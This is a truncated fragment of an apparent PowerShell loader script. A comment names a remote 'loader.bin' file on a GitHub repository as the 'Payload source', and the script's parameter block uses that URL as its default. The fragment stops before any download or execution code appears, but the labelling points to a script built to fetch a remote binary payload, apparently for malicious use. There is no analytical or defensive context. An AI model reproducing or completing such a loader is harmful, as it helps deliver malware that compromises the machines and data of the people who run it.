...
# Payload source: https://github.com/i25968627-blip/special-octo-guacamole-one/raw/refs/heads/main/loader.bin

param(
    [Parameter(Mandatory=$false, Position=0)]
    [string]$Url = "https://github.com/i25968627-blip/special-octo-guacamole-one/raw/refs/heads/main/loader.bin",
